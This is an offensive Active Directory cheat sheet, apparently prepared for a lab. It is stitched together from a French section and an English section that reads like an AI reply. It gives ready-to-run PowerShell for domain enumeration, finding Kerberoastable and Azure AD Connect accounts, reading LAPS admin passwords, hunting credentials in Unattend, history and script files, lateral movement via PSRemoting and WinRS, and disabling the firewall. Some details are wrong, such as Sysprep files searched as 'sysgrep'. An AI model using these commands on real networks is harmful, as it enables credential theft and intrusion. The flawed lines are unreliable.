### 1. Chargement des Modules
Si les outils RSAT ne sont pas installés mais que vous avez accès à la DLL, vous pouvez importer le module manuellement,.

```powershell
# Importer le module Active Directory depuis une DLL (si disponible localement)
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

### 2. Informations sur le Domaine et Politiques
Récupération des informations de base sur le domaine courant et les politiques de mots de passe,.

```powershell
# Obtenir les informations du domaine courant
Get-ADDomain

# Obtenir le contrôleur de domaine racine (RootDSE)
Get-ADRootDSE

# Récupérer la politique de mot de passe par défaut du domaine (Default Domain Policy)
Get-ADDefaultDomainPasswordPolicy

# Récupérer les politiques de mot de passe affinées (FGPP / Password Settings Objects)
# Nécessite souvent des privilèges, mais peut être tenté.
Get-ADFineGrainedPasswordPolicy -Filter *
```

### 3. Énumération des Utilisateurs et Groupes
Identification des utilisateurs, des administrateurs et des groupes sensibles,.

```powershell
# Lister tous les utilisateurs avec des propriétés détaillées
Get-ADUser -Filter * -Properties *

# Rechercher un utilisateur spécifique (ex: contenant "admin" dans le nom)
Get-ADUser -Filter 'SamAccountName -like "*admin*"' -Properties Description, LastLogonDate

# Obtenir les membres du groupe "Domain Admins"
Get-ADGroupMember -Identity "Domain Admins" -Recursive

# Obtenir les groupes dont un utilisateur spécifique est membre
Get-ADPrincipalGroupMembership -Identity "nom_utilisateur"

# Rechercher des comptes spécifiques liés à Azure AD Connect (MSOL_*) pour cibler le PHS
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Properties * | select SamAccountName, Description
```

### 4. Attaques Kerberoasting (SPN)
Identification des comptes de service vulnérables au Kerberoasting (comptes utilisateurs avec un Service Principal Name),.

```powershell
# Lister tous les utilisateurs possédant un SPN (Service Principal Name) non nul
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

### 5. Énumération des Ordinateurs et Contrôleurs de Domaine
Inventaire des machines et identification des systèmes d'exploitation.

```powershell
# Lister tous les ordinateurs du domaine avec leur système d'exploitation
Get-ADComputer -Filter * -Properties OperatingSystem, OperatingSystemVersion

# Trouver des contrôleurs de domaine spécifiques
Get-ADDomainController -Filter *
```

### 6. Relations d'Approbation (Trusts) et Forêts
Cartographie des relations de confiance entre domaines et forêts pour les mouvements latéraux,.

```powershell
# Lister les relations d'approbation (Trusts) du domaine courant
Get-ADTrust -Filter *

# Identifier spécifiquement les trusts inter-forêts (Forest Transitive)
Get-ADTrust -Filter 'IntraForest -ne $true'

# Énumérer les domaines de la forêt courante
(Get-ADForest).Domains
```

### 7. Objets Spéciaux et Configuration Avancée
Recherche de principaux de sécurité étrangers (Foreign Security Principals) et d'objets liés aux trusts PAM ou Shadow Principals,.

```powershell
# Rechercher des Foreign Security Principals (indique souvent des groupes inter-domaines/forêts)
Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"}

# Rechercher des Shadow Principals (utilisés dans les trusts PAM/Red Forest)
Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties *
```

### 8. Commandes Natives / WMI (Sans module AD)
Si le module AD n'est pas disponible, ces commandes natives peuvent aider.

```powershell
# Informations sur le système d'exploitation via WMI
Get-WmiObject -Class win32_operatingsystem

# Lister les processus locaux
Get-Process

# Lister les connexions réseau actives
Get-NetTCPConnection
```



Here are the commands for the remaining phases (Advanced Recon, Local Enumeration/Defense Evasion, Lateral Movement, and Credential Hunting) using **only native PowerShell** and the **Active Directory Module**, strictly excluding PowerView, based on your sources.

### 1. Advanced Reconnaissance (GPO, LAPS, SQL)

**Enumerating Group Policy & AppLocker**
Identifying security controls enforced by GPO (e.g., AppLocker) using native cmdlets and registry queries.

```powershell
# Get AppLocker Policy (Effective)
Get-AppLockerPolicy –Effective

# Get AppLocker Rule Collections
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Enumerate Registry for AppLocker Policies
Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2"
Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe"
```

**Enumerating LAPS (Local Admin Password Solution)**
Checking if LAPS is deployed and identifying privileged attributes without PowerView.

```powershell
# Check for LAPS Schema Object (confirms LAPS existence in domain)
Get-AdObject 'CN=ms-mcs-admpwd,CN=Schema,CN=Configuration,DC=techcorp,DC=local'

# Find Computers with LAPS enabled (checking Expiration Time attribute)
Get-ADComputer -Filter {ms-Mcs-AdmPwdExpirationTime -like "*"} -Properties ms-Mcs-AdmPwdExpirationTime

# Retrieve LAPS Password (if you have permissions)
# Note: Requires AD Module; replaces Get-AdmPwdPassword if module missing
Get-ADComputer -Identity "TargetComputer" -Properties ms-mcs-admpwd | Select-Object Name, ms-mcs-admpwd
```

**Enumerating SQL Servers via SPN**
Finding SQL instances using Service Principal Names.

```powershell
# Find MSSQL Service Accounts via SPN
Get-ADUser -Filter {ServicePrincipalName -like "*mssql*"} -Properties ServicePrincipalName
```

### 2. Local Enumeration & Defense Evasion

**Enumerating Protection Mechanisms (Defender/AMSI)**
Checking the state of Windows Defender and language modes.

```powershell
# Check Windows Defender Preferences
Get-MpPreference

# Check PowerShell Language Mode (Constraint Language Mode check)
$ExecutionContext.SessionState.LanguageMode
```

**Searching for Sensitive Files (Passwords/Config)**
Hunting for credentials in standard Windows files natively.

```powershell
# Recursively search for Unattend.xml files (often contain base64 creds)
Get-ChildItem -path C:\Windows\Panther\* -Recurse -Include *Unattend.xml*

# Search for Sysprep files
Get-ChildItem -path C:\Windows\system32\* -Recurse -Include *sysgrep.xml*, *sysgrep.inf*

# Search for PowerShell Console History
Get-Childitem -Path C:\Users\* -Force -Include *ConsoleHost_history* -Recurse -ErrorAction SilentlyContinue

# Search for specific strings (e.g., "password") in scripts
Get-ChildItem -path C:\* -Recurse -Include *.xml,*.ps1,*.bat,*.txt | Select-String "password"
```

### 3. Lateral Movement (Native PowerShell)

**PowerShell Remoting (WinRM)**
Moving laterally without external tools using native PSRemoting.

```powershell
# Create a Credential Object
$pass = ConvertTo-SecureString 'Password123' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("DOMAIN\User", $pass)

# Create a Persistent Session
$session = New-PSSession -ComputerName "TargetMachine" -Credential $cred

# Enter Interactive Session
Enter-PSSession $session

# Execute Commands Remotely (Non-interactive)
Invoke-Command -Scriptblock {Get-Process} -Session $session

# Execute Local Script on Remote Machine
Invoke-Command -FilePath C:\Scripts\Payload.ps1 -ComputerName "TargetMachine"
```

**WMI & Network Management**
Using WMI for reconnaissance and firewall manipulation.

```powershell
# Query Operating System Info via WMI
Get-WmiObject -Class win32_operatingsystem -ComputerName "TargetMachine"

# Disable Firewall (Requires Admin)
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

**Native WinRS (Windows Remote Shell)**
Alternative to PowerShell Remoting if WinRM is enabled.

```powershell
# Execute command via WinRS
winrs -remote:TargetServer -u:DOMAIN\User -p:Password hostname
```

### 4. Privilege Escalation & Persistence (Domain Level)

**Azure AD Connect Enumeration**
Identifying accounts related to Azure AD Connect (often targets for DCSync).

```powershell
# Find MSOL Accounts (AD Connect Sync Accounts)
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Properties * | select SamAccountName,Description
```

**Password Policy Enumeration**
Checking for Fine Grained Password Policies (PSO) that might be weaker than the domain default.

```powershell
# Get all Fine Grained Password Policies
Get-ADFineGrainedPasswordPolicy -Filter *

# Get Resultant Policy for a specific user
Get-ADUserResultantPasswordPolicy -Identity "TargetUser"
```

**Group Recursion**
Mapping nested group memberships without PowerView.

```powershell
# Function to get recursive group membership using native AD Module
function Get-ADPrincipalGroupMembershipRecursive ($SamAccountName) {
    $groups = @(Get-ADPrincipalGroupMembership -Identity $SamAccountName | select -ExpandProperty distinguishedname)
    $groups
    if ($groups.count -gt 0) {
        foreach ($group in $groups) {
            Get-ADPrincipalGroupMembershipRecursive $group
        }
    }
}

# Usage
Get-ADPrincipalGroupMembershipRecursive 'TargetUser'
```
